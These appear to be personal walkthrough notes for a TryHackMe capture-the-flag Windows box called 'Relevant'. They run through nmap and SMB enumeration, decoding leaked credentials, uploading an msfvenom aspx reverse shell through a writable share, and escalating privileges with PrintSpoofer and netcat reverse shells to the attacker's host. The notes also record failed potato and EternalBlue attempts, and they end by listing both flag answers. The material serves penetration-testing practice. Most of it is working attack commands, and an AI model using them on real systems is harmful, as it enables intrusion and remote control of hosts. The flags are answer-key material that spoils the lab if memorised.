
TODO:
- [ ] Add Gobuster commands to cheatsheet (especially the commands for exenetions etc.)
- [ ] Modfiy GOBUST alias, make medium the default list. 

# IPs:
10.201.48.118
10.201.70.3
10.201.46.189

# TOPTCP
```
80/tcp   open  http          syn-ack ttl 126                                                                                                                                
135/tcp  open  msrpc         syn-ack ttl 126                                                                                                                                
139/tcp  open  netbios-ssn   syn-ack ttl 126                                                                                                                                
445/tcp  open  microsoft-ds  syn-ack ttl 126                                                                                                                                
3389/tcp open  ms-wbt-server syn-ack ttl 126                                                                                                                                

```

# FULLTCP
```powershell
# Nmap 7.95 scan initiated Mon Oct 13 11:03:01 2025 as: /usr/lib/nmap/nmap -Pn -n -sS --vv -p- -A -oN TCPSCAN.log 10.201.48.118
Nmap scan report for 10.201.48.118
Host is up, received user-set (0.047s latency).
Scanned at 2025-10-13 11:03:02 EDT for 770s
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 126 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2025-10-13T15:15:48+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-12T14:59:13
| Not valid after:  2026-04-13T14:59:13
| MD5:   d03a:6a17:44c3:2b72:88d2:918a:6e55:5577
| SHA-1: 8f14:235e:4b18:4c98:6e71:876f:c4f8:dc48:1566:f061
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQL01hwSxEi65AWl9yitjO2zANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNTEwMTIxNDU5MTNaFw0yNjA0MTMxNDU5
| MTNaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEApUVe77GZ9aMsSjxVtBpRqNvfJDLNGe9t3xocmgqIWZ4SV4JszO/9
| 4zMGop/aBFAEZX+XfJtIrcNpRsb5lRUhjSSG+pZatz0K3U1qtXQ26Fk6+Q8onBJ7
| dlTAEkWd/Yqca0vNMr3OIWPNSRELLiYnnQGIsBEJphIbIFd8CJGRpBpvUluy3j4N
| ntCLRTeIPHu5b8HCoZsVx6xuLWEK1TFcmQ2LfCMZ03eZzFYJTXrIdEk0Tb1d0kZ9
| G+9kwHp6mnvP4lcMewz15XTsqNwm72KMc8FeTMxtAMC6HBEGyf8guPQBNJ8F1CMj
| AJCubglallZf8LkfL/dZMtgis8Fcw296awIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAIkEWo/48Dcf
| vgQYJx3z2dPXDkteV2tuE1ASp8W5MF8Qu12LU84lGP6Tkh8SQuaMCeZmgFlBxhkc
| qCG47Bn9VzAr6EfVZ3gku5XhEvS1TRCyFhyeyFPMh8x0ovMBXV6dVTwjk0hyrDnv
| V1CvJ3uWRND45FaHXgrygwO/7trdnQQcLX+vnzdgwVZGMOzseRras6jFLvGJC4jK
| 8lxOikINdX3I7OpxIR3+Bu6CZGQgq4UaMligJDEb8xBtuSB33vJTvSlwj8uaexxa
| 2KDwiuTQibJH0uXqjkT1nyvc9bnv0wUSUAvgJ/IvGwCuDTqkfUCgsOuUDQce9Vpt
| v67XfEqsQFA=
|_-----END CERTIFICATE-----
49663/tcp open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Microsoft-IIS/10.0
49666/tcp open  unknown       syn-ack ttl 126
49667/tcp open  unknown       syn-ack ttl 126
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=10/13%OT=80%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=68ED17A8%P=x86_64-pc-linux-gnu)
SEQ(TI=I%TS=B)
SEQ(SP=103%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=A)
OPS(O1=M509NW8ST11%O2=M509NW8ST11%O3=M509NW8NNT11%O4=M509NW8ST11%O5=M509NW8ST11%O6=M509ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M509NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.008 days (since Mon Oct 13 11:03:52 2025)
Network Distance: 3 hops
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h44m59s, deviation: 3h30m02s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15632/tcp): CLEAN (Timeout)
|   Check 2 (port 37534/tcp): CLEAN (Timeout)
|   Check 3 (port 52910/udp): CLEAN (Timeout)
|   Check 4 (port 53701/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-13T08:14:48-07:00
| smb2-time: 
|   date: 2025-10-13T15:14:46
|_  start_date: 2025-10-13T14:59:13

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   42.05 ms 10.6.0.1
2   ...
3   45.24 ms 10.201.48.118

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 13 11:15:52 2025 -- 1 IP address (1 host up) scanned in 770.35 seconds

```
# SMB
``` powershell

>>> crackmapexec smb 10.201.48.118

	SMB         10.201.48.118   445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64
	(name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)

>>> smbclient -L //10.201.48.118 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
  
>>> smbclient //10.201.48.118/nt4wrksv -N
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Mon Oct 13 11:31:22 2025
	  ..                                  D        0  Mon Oct 13 11:31:22 2025
	  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
	  
>>> get passwords.txt

	[User Passwords - Encoded]
	Qm9iIC0gIVBAJCRXMHJEITEyMw==
	QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

# Tried to decrypt passwords and use it with RDP, didn't work. 

# Trying again with SMB
>>> smbclient //10.201.70.3/ADMIN$ -U Relevant/Bob --password '!P@$$W0rD!123'
>>> smbclient //10.201.70.3/C$ -U Relevant/Bob --password '!P@$$W0rD!123'
>>> smbclient //10.201.70.3/IPC$ -U Relevant/Bob --password '!P@$$W0rD!123'
>>> smbclient //10.201.70.3/nt4wrksv -U Relevant/Bob --password '!P@$$W0rD!123'
#No luck
>>> smbclient //10.201.70.3/ADMIN$ -U Relevant/Bill --password 'Juw4nnaM4n420696969!$$$'
>>> smbclient //10.201.70.3/C$ -U Relevant/Bill --password 'Juw4nnaM4n420696969!$$$'
>>> smbclient //10.201.70.3/IPC$ -U Relevant/Bill --password 'Juw4nnaM4n420696969!$$$'
>>> smbclient //10.201.70.3/nt4wrksv -U Relevant/Bill --password 'Juw4nnaM4n420696969!$$$'

>>> crackmapexec smb 10.201.70.3 -u Relevant/Bob -p '!P@$$W0rD!123'
>>> crackmapexec smb 10.201.70.3 -u Bob -p '!P@$$W0rD!123'
>>> crackmapexec smb 10.201.70.3 -d Relevant -u Bob -p '!P@$$W0rD!123'
>>> crackmapexec smb 10.201.70.3 -d Relevant -u Bob -p '!P@$$W0rD!123' --users
>>> crackmapexec smb 10.201.70.3 -d Relevant -u Bob -p '!P@$$W0rD!123' --shares

	SMB         10.201.70.3     445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
	SMB         10.201.70.3     445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
	SMB         10.201.70.3     445    RELEVANT         [+] Enumerated shares
	SMB         10.201.70.3     445    RELEVANT         Share           Permissions     Remark
	SMB         10.201.70.3     445    RELEVANT         -----           -----------     ------
	SMB         10.201.70.3     445    RELEVANT         ADMIN$                          Remote Admin
	SMB         10.201.70.3     445    RELEVANT         C$                              Default share
	SMB         10.201.70.3     445    RELEVANT         IPC$                            Remote IPC
	SMB         10.201.70.3     445    RELEVANT         nt4wrksv        READ,WRITE      


# nothing much found that we already didn't know. But it looks like we have WRITE access to nt4wrksv share. 
# Usually when we have WRITE access, we might be able to access the share from the webserver(port 80 or others) by browsing to the path
# In this case, we have two webservers, port 80 and port 49663. So it's important that we enumerate available directories 
# Especially, we must look for nt4wrksv path. 
```

# Creds

```powershell

>>> echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123

>>> echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$

```

# RDP
```powershell
# none of the below worked
xfreerdp3 /v:10.201.48.118 /u:Bob /p:'!P@$$W0rD!123' +clipboard /dynamic-resolution 
xfreerdp3 /v:10.201.48.118 /u:Bill /p:'Juw4nnaM4n420696969!$$$' +clipboard /dynamic-resolution 

# Trying rdesktop
rdesktop -u Bob -p '!P@$$W0rD!123' 10.201.48.118
rdesktop -u Bill -p 'Juw4nnaM4n420696969!$$$' 10.201.48.118
# no luck
```

# WEBSERVER
```powershell
# GOBUSTER on port 80 didn't find anything.
# Trying port 49663
>>> gobuster dir --no-color -u "http://10.201.70.3:49663/" -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -o "gobuster_medium.log"

#Go buster died in between but I checked for /nt4wrksv path and it can be found on  10.201.70.3:49663/nt4wrksv. We can also access to SMB:
10.201.70.3:49663/nt4wrksv/passwords.txt (can read this file from browser)


# Create a aspx payload and upload it to SMB server
>>> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.15.192 LPORT=1337 -f aspx -o rev.aspx
>>> smbclient //10.201.46.189/nt4wrksv -N
>>> put rev.aspx


# Set up a listener
>>> rlwrap nc -nlvp 1337

# browse to the right path to execute the revshell
10.201.46.189:49663/nt4wrksv/rev.aspx

# caught a shell
>>> dir C:\user.txt /s /b
# Found user.txt flag:
>>> type C:\Users\Bob\Desktop\user.txt 
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

# PrivEsc Check

```powershell
>>> systeminfo
10.0.14393 N/A Build 14393 #Vulnerable to kernel exploit , but requires RDP, so we can't use this. 
# https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213/Binaries


>>> whoami /priv
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

# SeImpersonate exists and enabled
# SeAssignPrimaryTokenPriv is exists

# probably we can take advantage of GodPotato, JuicyPotato, PrintSpoofer, Meterpreter getsystem, standalone Incognito or using meterpreter module.

  
```


# PivEsc Method One: METERPRETER (didn't work)

```powershell
# Tried two payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.6.15.192 LPORT=443 -f exe -o meterpreter443_10_6_15_192.exe
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.15.192 LPORT=443 -f exe -o meterpreter443_10_6_15_192.exe

# The host couldn't run eaither:
c:\inetpub\wwwroot\nt4wrksv>meterpreter443_10_6_15_192.exe
meterpreter443_10_6_15_192.exe
The system cannot execute the specified program.

```

#  PivEsc Method Two: PrintSpoofer64.exe  (WORKED)

```powershell
>>> smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (121.0 kB/s) (average 117.7 kB/s)

(target)
PrintSpoofer64.exe -i -c "cmd" 
# this worked. I got new shell with escalated priv.

#Alternatively, you could use nc to get escalated priv in a new window:
(attackbox) rlwrap nc -nlvp 443
(target) PrintSpoofer64.exe -c "nc64.exe 10.6.15.192 443 -e cmd"

>>> where /r C:\ root.txt
C:\Users\Administrator\Desktop\root.txt

>>> type 
THM{1fk5kf469devly1gl320zafgl345pv}
```

# PivEsc Method THREE: Incongnito  (didn't work)

```powershell
c:\inetpub\wwwroot\nt4wrksv>incognito.exe list_tokens -u
incognito.exe list_tokens -u
The system cannot execute the specified program.
```

# PivEsc Method Four: GodPotato  (didn't work)

```powershell
c:\inetpub\wwwroot\nt4wrksv>GodPotato-NET4.exe -cmd "nc64.exe 10.6.15.192 443 -e cmd"
GodPotato-NET4.exe -cmd "nc64.exe 10.6.15.192 443 -e cmd"                            
[*] CombaseModule: 0x140737181974528                                                 
[*] DispatchTable: 0x140737183951328                                                 
[*] UseProtseqFunction: 0x140737183481648                                            
[*] UseProtseqFunctionParamCount: 5                                                  
[*] HookRPC                                                                          
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\cc9c00cb-1373-4051-8c9c-bcc35a16bfca\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000b402-0d10-ffff-8b20-cad4d86ecf33
[*] DCOM obj OXID: 0x75cd5cde69414822      
[*] DCOM obj OID: 0xb9bcc77a323a1c8a       
[*] DCOM obj Flags: 0x281                  
[*] DCOM obj PublicRefs: 0x0               
[*] Marshal Object bytes len: 100          
[*] UnMarshal Object                       
[*] UnmarshalObject: 0x80070005            
[!] Failed to impersonate security context token              
```

# PivEsc Method Five: JuicyPotato  (didn't work)
```Powershell

>>> c:\inetpub\wwwroot\nt4wrksv>.\JuicyPotato.exe -l 9090 -p C:\Windows\System32\cmd.exe -a "/c c:\inetpub\wwwroot\nt4wrksv\nc64.exe -e cmd.exe 10.6.15.192 1336" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 

The system cannot execute the specified program.

>>> reg query "HKLM\Software\Microsoft\OLE" /v EnableDCOM
EnableDCOM    REG_SZ    N

# DCOM is Disabled - JuicyPotato wouldn't work anyway

```


# PivEsc Method Six - smb-vuln-ms17-010  (didn't work)
```powershell
# From the initial FULL TCP SCAN, we can see SMBv1 is enabled.
# Additionally, enueration found that the target OS is Windows Server 2016 Standard Evaluation

# Further enumeration of SMB:
>>> nmap -p 139,445 -Pn –script smb-enum* 10.10.10.40
#output snipped - showed info that we already knew

>>> nmap -Pn -n  -script smb-vuln* -p139,445 10.201.10.113 -oN nmap_smb_enum_vuln.log

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/


# so the host is vulnerable to Eternal Blue (ms17-010)
# used:
 AutoBlue: https://github.com/3ndG4me/AutoBlue-MS17-010:
 >>> (kali㉿kali)-[~/Tools/Exploits/AutoBlue-MS17-010/shellcode] > ./shell_prep.sh./shell_prep.sh
 >>> python3 eternalblue_exploit7.py 10.201.81.4 ./shellcode/sc_x64_msf.bin
 >>> python3 eternal_checker.py -target-ip 10.201.81.4 -port 445 'Bob:!P@$$W0rD!123@Relevant'
 >>> python3 zzz_exploit.py -target-ip 10.201.81.4 -port 445 'Bill:Juw4nnaM4n420696969!$$$@Relevant'  
 >>> python3 eternalblue_exploit7.py -target-ip 10.201.81.4 -port 445 'Bill:Juw4nnaM4n420696969!$$$@Relevant' ./shellcode/sc_x64_msf.bi
 
 Tried Metasploit 
 
 
 #No luck



```
# Answers

```powershell
# User.txt flag
THM{fdk4ka34vk346ksxfr21tg789ktf45}

# root.txt flag:
THM{1fk5kf469devly1gl320zafgl345pv}
```